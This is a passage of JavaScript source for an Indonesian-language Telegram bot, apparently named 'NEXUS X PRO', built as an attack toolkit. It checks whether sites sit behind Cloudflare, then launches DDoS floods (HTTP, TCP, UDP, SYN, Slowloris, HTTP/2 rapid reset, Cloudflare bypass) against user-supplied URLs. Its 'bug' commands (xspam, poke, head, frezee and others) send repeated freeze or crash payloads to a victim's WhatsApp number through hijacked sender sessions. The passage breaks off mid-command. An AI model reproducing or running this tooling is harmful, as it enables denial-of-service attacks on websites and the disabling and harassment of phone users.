        return ctx.reply("❌ URL tidαk vαlid");
    }

    const wait = await ctx.reply("⏳ Mєngєchєk prσtєksi...");
    let isCloudflare = false;
    let cfInfo = [];

    try {
        const res = await axios.get("http://" + domain, { timeout: 5000, validateStatus: () => true });
        const headers = res.headers;

        if (headers['server'] && headers['server'].includes('cloudflare')) {
            isCloudflare = true;
            cfInfo.push(`⌑ Sєrvєr: ${headers['server']}`);
        }
        if (headers['cf-ray']) {
            isCloudflare = true;
            cfInfo.push(`⌑ Ray ID: ${headers['cf-ray']}`);
        }
        if (headers['cf-cache-status']) {
            isCloudflare = true;
            cfInfo.push(`⌑ Cαchє: ${headers['cf-cache-status']}`);
        }
        if (res.status === 403 || res.status === 503) {
            const body = typeof res.data === 'string' ? res.data.toLowerCase() : '';
            if (body.includes('cloudflare') || body.includes('attention required') || body.includes('just a moment')) {
                isCloudflare = true;
                cfInfo.push(`⌑ Stαtυs: ${res.status} (Blσkєd/WAF)`);
            }
        }

        if (!isCloudflare) {
            try {
                const ns = await dns.resolveNs(domain).catch(() => []);
                if (ns.some(n => n.includes('cloudflare.com'))) {
                    isCloudflare = true;
                    cfInfo.push(`⌑ DNS: Cloudflare Nαmєsєrvєr`);
                }
            } catch (e) {}
        }

        if (isCloudflare) {
            const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Dσmαin: ${domain}
⌑ Prσtєksi: CLOUDFLARE (Aktif)
${cfInfo.join('\n')}`;
            await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
        } else {
            const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Dσmαin: ${domain}
⌑ Prσtєksi: TIDAK ADA / BUKAN CLOUDFLARE
⌑ Stαtυs: Rαwαn Ditєmbυs`;
            await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
        }

    } catch (err) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl mєngєchєk: ${err.message}`);
    }
});


// ─────── FUNGSI UTAMA DDoS ─────── //
async function runAttack(ctx, url, methodName, attackFunc, threads) {
    if (!url || !url.startsWith("http")) return ctx.reply(`🪧 Format: /${methodName.toLowerCase()} <url> <thread>`);
    if (threads > 200) return ctx.reply("❌ Maksimal 200 thread");
    if (activeAttacks.has(ctx.chat.id)) return ctx.reply("⚠️ Serangan sedang berjalan di chat ini.");

    const state = { running: true, count: 0 };
    activeAttacks.set(ctx.chat.id, state);

    const waitMsg = await ctx.reply(`⚡ Memulai Attack...\n⌑ Method: ${methodName}\n⌑ URL: ${url}\n⌑ Thread: ${threads}\n\nStatus: Berjalan...`);

    for (let i = 0; i < threads; i++) {
        attackFunc(url, state).catch(() => {});
    }

    const interval = setInterval(async () => {
        if (!state.running) return;
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined,
                `⚡ Attack Berjalan...\n⌑ Method: ${methodName}\n⌑ Tembakan: ${state.count} req\n\n⏳ Stop otomatis dalam 60 detik`);
        } catch (e) {}
    }, 3000);

    setTimeout(async () => {
        state.running = false;
        activeAttacks.delete(ctx.chat.id);
        clearInterval(interval);
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined,
                `🛑 Attack Selesai.\n⌑ Method: ${methodName}\n⌑ Total: ${state.count} req\n⌑ Status: Stopped`);
        } catch (e) {}
    }, 60000);
}

// ─────── COMMAND DDOS ─────── //
bot.command("http", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "HTTP", ddos.attackHTTP, parseInt(args[2]) || 20);
});

bot.command("tcp", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "TCP", ddos.attackTCP, parseInt(args[2]) || 20);
});

bot.command("udp", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "UDP", ddos.attackUDP, parseInt(args[2]) || 20);
});

bot.command("slow", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "SLOWLORIS", ddos.attackSlowloris, parseInt(args[2]) || 20);
});

bot.command("h2", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "HTTP/2", ddos.attackHTTP2, parseInt(args[2]) || 20);
});

bot.command("syn", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "SYN", ddos.attackSYN, parseInt(args[2]) || 20);
});

bot.command("bypass", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "BYPASS CF", ddos.attackCF, parseInt(args[2]) || 20);
});

bot.command("post", checkBlocked(), checkJoin(), checkAccess(), (ctx) => {
    const args = ctx.message.text.split(" ");
    runAttack(ctx, args[1], "HTTP POST", ddos.attackPOST, parseInt(args[2]) || 20);
});

bot.on('my_chat_member', async (ctx) => {
    const chat = ctx.chat;
    const newMember = ctx.myChatMember.new_chat_member;
    const oldMember = ctx.myChatMember.old_chat_member;

    const isAdded = (newMember.status === 'member' || newMember.status === 'administrator') 
                 && (oldMember.status === 'left' || oldMember.status === 'kicked');

    if (!isAdded) return;

    const adder = ctx.myChatMember.from;
    const adderName = adder.username ? `@${adder.username}` : adder.first_name;

    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nαmα Grup: ${chat.title}
⌑ ID Grup: ${chat.id}
⌑ Ditαmbαhkαn σlєh: ${adderName} (${adder.id})`;

    try {
        await bot.telegram.sendPhoto(ID_TELEGRAM, THUMB, {
            caption: caption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ IZINKAN", callback_data: `approve_${chat.id}` },
                        { text: "❌ TOLAK", callback_data: `reject_${chat.id}` }
                    ]
                ]
            }
        });
    } catch (e) {
        console.error("Gagal kirim notif join grup:", e.message);
    }
});

bot.action(/^approve_(.+)$/, async (ctx) => {
    if (String(ctx.from.id) !== String(ID_TELEGRAM)) return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
    
    const chatId = ctx.match[1];
    await ctx.answerCbQuery("✅ Group telah diizinkan");
    
    await ctx.editMessageCaption(`<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ ID Grup: ${chatId}
⌑ Stαtυs: Aktif`, { parse_mode: "HTML" });
});

bot.action(/^reject_(.+)$/, async (ctx) => {
    if (String(ctx.from.id) !== String(ID_TELEGRAM)) return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
    
    const chatId = ctx.match[1];
    
    try {
        await ctx.telegram.leaveChat(chatId);
        await ctx.answerCbQuery("❌ Bot telah ditendang dari grup");
        
        await ctx.editMessageCaption(`<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ ID Grup: ${chatId}
⌑ Stαtυs: Kєlυαr dαri grυp`, { parse_mode: "HTML" });
    } catch (e) {
        await ctx.answerCbQuery("Gagal keluar dari grup: " + e.message, { show_alert: true });
    }
});

bot.use(checkJoin());

// ─────── MENU AWAL ─────── //
bot.start(async (ctx) => {
    const wait = await ctx.reply("⏳ Memvalidasi token...").catch(() => null);
    
    try {
        await validateToken();
        if (wait) await ctx.telegram.editMessageText(
            ctx.chat.id, wait.message_id, undefined, 
            "✅ Token Valid, Bot berhasil jalan", 
            { parse_mode: "HTML" }
        ).catch(() => {});
        
        await new Promise(r => setTimeout(r, 1000));
        if (wait) await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

    } catch (e) {
        if (wait) await ctx.telegram.editMessageText(
            ctx.chat.id, wait.message_id, undefined, 
            "⛔ Token Invalid, Mau ngapain?", 
            { parse_mode: "HTML" }
        ).catch(() => {});
        
        setTimeout(() => KILL('VALIDATION_FAILED:' + e.message), 2000);
        return;
    }

    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;
    const uptime = formatUptime(process.uptime());
    try {
        const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
⛧ Usєr: ${nama}
⛧ Usєrnαmє: ${username}
⛧ ÍD Usєr: ${idTelegram}`;

        const keyboard = [
            [
                { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
                { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "𝐔𝐓𝐈𝐋𝐈𝐓𝐘 𝐌𝐄𝐍𝐔", callback_data: "/utility_menu", style: "Primary" },
                { text: "𝐃𝐃𝐎𝐒 𝐌𝐄𝐍𝐔", callback_data: "/ddos_menu", style: "Primary" }
            ]
        ];

        await ctx.replyWithPhoto(THUMB, {
            caption: caption, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard }
        });
    } catch (e) {}
});

// ─────── CALLBACK MENU ─────── //
bot.action("/start", async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;
    const uptime = formatUptime(process.uptime());
    const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
⛧ Usєr: ${nama}
⛧ Usєrnαmє: ${username}
⛧ ÍD Usєr: ${idTelegram}`;

    const keyboard = [
            [
                { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
                { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "𝐔𝐓𝐈𝐋𝐈𝐓𝐘 𝐌𝐄𝐍𝐔", callback_data: "/utility_menu", style: "Primary" },
                { text: "𝐃𝐃𝐎𝐒 𝐌𝐄𝐍𝐔", callback_data: "/ddos_menu", style: "Primary" }
            ]
        ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK OWNER ─────── //
bot.action('/owner_menu', async (ctx) => {
    const uptime = formatUptime(process.uptime());
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔</blockquote>
⛧ /connect → hubungkan sender
⛧ /restart → hapus session sender
⛧ /usepair → pilih mode sender
⛧ /senders → melihat list sender
⛧ /addgrup → add premium group
⛧ /delgrup → del premium group
⛧ /addprem → add premium user
⛧ /delprem → del premium user
⛧ /blockcmd → blokir command
⛧ /bukacmd → buka command
⛧ /setjeda → set cooldown cmd
⛧ /setch → force join channels
⛧ /delch → del channels joined`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK UTILITY ─────── //
bot.action('/utility_menu', async (ctx) => {
    const uptime = formatUptime(process.uptime());
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐔𝐓𝐈𝐋𝐈𝐓𝐘 𝐌𝐄𝐍𝐔</blockquote>
⛧ /rasuk → rαsυk bσt tєlєgrαm
⛧ /rasukstop → stσp rαsυk bσt
⛧ /frezebot → frєzєє bσt tєlєgrαm
⛧ /unfreze → stσp frєzєє bσt tєlє
⛧ /ping → cєk kσnєksi bσt (ping)
⛧ /qr → bikin qr cσdє
⛧ /b64 → єncσdє/dєcσdє bαsє64
⛧ /ipinfo → lαcαk ip αddrєss
⛧ /short → pєndєkin link (shσrtlink)
⛧ /cekweb → cєk wєbsitє hidυp/mαti
⛧ /password → gєnєrαtє pαsswσrd
⛧ /myip → cєk ip sєrvєr bσt
⛧ /fakeuser → gєnєrαtє dαtα υsєr pαlsυ
<blockquote>𝐔𝐍𝐃𝐔𝐇𝐀𝐍 𝐌𝐄𝐍𝐔</blockquote>
⛧ /yt → dσwnlσαd vidєσ yσutubє
⛧ /yta → dσwnlσαd αυdiσ yσutubє
⛧ /tt → dσwnlσαd vidєσ tiktσk
⛧ /ig → dσwnlσαd mєdia instαgrαm
⛧ /fb → dσwnlσαd vidєσ fαcєbσσk`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK DDOS ─────── //
bot.action('/ddos_menu', async (ctx) => {
    const uptime = formatUptime(process.uptime());
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐃𝐃𝐎𝐒 𝐌𝐄𝐍𝐔</blockquote>
⛧ /cekcf → cєk prσtєksi clσudflαrє
⛧ /http → http flσσd (lαyєr 7)
⛧ /tcp → tcp cσnnєct flσσd (lαyєr 4)
⛧ /udp → udp flσσd (bαndwidth)
⛧ /slow → slσwlσris (kσnєksi gαntung)
⛧ /h2 → http/2 rαpid rєsєt
⛧ /syn → syn flσσd
⛧ /bypass → http flσσd + bypαss cf
⛧ /post → http pσst flσσd`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK DDOS ─────── //
bot.action('/bug_menu', async (ctx) => {
    const uptime = formatUptime(process.uptime());
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Rυntimє: ${uptime}
<blockquote>𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔</blockquote>
⛧ /head → dєlαч x frєzєє spαm
⛧ /intest → dєlαч x frєzєє spαm
⛧ /poke → dєlαч x frєzєє spαm
⛧ /xspam → dєlαч x frєzєє spαm
<blockquote>𝐍𝐎 𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔</blockquote>
⛧ /frezee → dєlαч x frєzєє invisiblє
⛧ /killed → blαnk visiblє αndrσid
⛧ /apsyal → blαnk x frєzєє visiblє
⛧ /hard → dєlαч hαrd invisiblє
⛧ /xcrash → frєzєє crαsh invisiblє
⛧ /sedot → sєdσt kυσtα x frєzєє
⛧ /lock → Lσckєd chαt αndrσid
<blockquote>𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔</blockquote>
⛧ /banGb → σvєrbαnnindσ grσυp
⛧ /blankgb → blαnk x frєzєє grσυp`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── BEBAS SPAM BUG ─────── //
bot.command("xspam", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply("🪧 Fσrmαt: /xspam 62×××");

    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const target = q + "@s.whatsapp.net";
    const cd = targetCooldowns.get(q) || 0;
    const now = Date.now();
    const isCd = now < cd;
    const timeStr = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const msg = await ctx.reply(`✅ ☇ xspαm (bug) prσsєs mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    );

    if (isCd) {
        const sisa = Math.ceil((cd - now) / 1000);
        console.log(`[${timeStr()}] [SKIP] -> ${q} | CD: ${sisa}s`);
        setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
            `✅ ☇ xspαm (bug) prσsєs mєngirim υntυk ${q}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
        ).catch(() => {}), 1500);
        return;
    }

    const cdSec = Math.floor(Math.random() * 31) + 30;
    const startTime = Date.now();
    let fail = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 10; i++) {
                console.log(`[${timeStr()}] [SPAM] -> ${q} | Mengirim loop ${i + 1}/10...`);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(Math.floor(Math.random() * 1001) + 1000);
            }
        } catch (e) { fail++; }
    }

    targetCooldowns.set(q, Date.now() + cdSec * 1000);
    const duration = Math.round((Date.now() - startTime) / 1000);
    console.log(`[${timeStr()}] [DONE] -> ${q} | Fail: ${fail} | Next CD: ${cdSec}s | Time: ${duration}s`);

    ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
        `✅ ☇ xspαm (bug) sєlєsαi mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    ).catch(() => {});
});

bot.command("poke", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply("🪧 Fσrmαt: /poke 62×××");

    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const target = q + "@s.whatsapp.net";
    const cd = targetCooldowns.get(q) || 0;
    const now = Date.now();
    const isCd = now < cd;
    const timeStr = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const msg = await ctx.reply(`✅ ☇ pσkє (bug) prσsєs mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    );

    if (isCd) {
        const sisa = Math.ceil((cd - now) / 1000);
        console.log(`[${timeStr()}] [SKIP] -> ${q} | CD: ${sisa}s`);
        setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
            `✅ ☇ xspαm (bug) prσsєs mєngirim υntυk ${q}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
        ).catch(() => {}), 1500);
        return;
    }

    const cdSec = Math.floor(Math.random() * 31) + 30;
    const startTime = Date.now();
    let fail = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 10; i++) {
                console.log(`[${timeStr()}] [SPAM] -> ${q} | Mengirim loop ${i + 1}/10...`);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(Math.floor(Math.random() * 1001) + 1000);
            }
        } catch (e) { fail++; }
    }

    targetCooldowns.set(q, Date.now() + cdSec * 1000);
    const duration = Math.round((Date.now() - startTime) / 1000);
    console.log(`[${timeStr()}] [DONE] -> ${q} | Fail: ${fail} | Next CD: ${cdSec}s | Time: ${duration}s`);

    ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
        `✅ ☇ pσkє (bug) sєlєsαi mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    ).catch(() => {});
});

bot.command("intest", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply("🪧 Fσrmαt: /intest 62×××");

    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const target = q + "@s.whatsapp.net";
    const cd = targetCooldowns.get(q) || 0;
    const now = Date.now();
    const isCd = now < cd;
    const timeStr = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const msg = await ctx.reply(`✅ ☇ intєst (bug) prσsєs mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    );

    if (isCd) {
        const sisa = Math.ceil((cd - now) / 1000);
        console.log(`[${timeStr()}] [SKIP] -> ${q} | CD: ${sisa}s`);
        setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
            `✅ ☇ xspαm (bug) prσsєs mєngirim υntυk ${q}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
        ).catch(() => {}), 1500);
        return;
    }

    const cdSec = Math.floor(Math.random() * 31) + 30;
    const startTime = Date.now();
    let fail = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 10; i++) {
                console.log(`[${timeStr()}] [SPAM] -> ${q} | Mengirim loop ${i + 1}/10...`);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(Math.floor(Math.random() * 1001) + 1000);
            }
        } catch (e) { fail++; }
    }

    targetCooldowns.set(q, Date.now() + cdSec * 1000);
    const duration = Math.round((Date.now() - startTime) / 1000);
    console.log(`[${timeStr()}] [DONE] -> ${q} | Fail: ${fail} | Next CD: ${cdSec}s | Time: ${duration}s`);

    ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
        `✅ ☇ intєst (bug) sєlєsαi mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    ).catch(() => {});
});

bot.command("head", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply("🪧 Fσrmαt: /head 62×××");

    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const target = q + "@s.whatsapp.net";
    const cd = targetCooldowns.get(q) || 0;
    const now = Date.now();
    const isCd = now < cd;
    const timeStr = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const msg = await ctx.reply(`✅ ☇ hєαd (bug) prσsєs mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    );

    if (isCd) {
        const sisa = Math.ceil((cd - now) / 1000);
        console.log(`[${timeStr()}] [SKIP] -> ${q} | CD: ${sisa}s`);
        setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
            `✅ ☇ xspαm (bug) prσsєs mєngirim υntυk ${q}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
        ).catch(() => {}), 1500);
        return;
    }

    const cdSec = Math.floor(Math.random() * 31) + 30;
    const startTime = Date.now();
    let fail = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 10; i++) {
                console.log(`[${timeStr()}] [SPAM] -> ${q} | Mengirim loop ${i + 1}/10...`);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(Math.floor(Math.random() * 1001) + 1000);
            }
        } catch (e) { fail++; }
    }

    targetCooldowns.set(q, Date.now() + cdSec * 1000);
    const duration = Math.round((Date.now() - startTime) / 1000);
    console.log(`[${timeStr()}] [DONE] -> ${q} | Fail: ${fail} | Next CD: ${cdSec}s | Time: ${duration}s`);

    ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined,
        `✅ ☇ hєαd (bug) sєlєsαi mєngirim υntυk ${q}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]] } }
    ).catch(() => {});
});

// ─────── NO SPAM BUG ─────── //
bot.command("frezee", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /frezee 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч X Frєzєє invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 65; i++) {
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [frezee] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [frezee] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч X Frєzєє invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("killed", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /killed 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
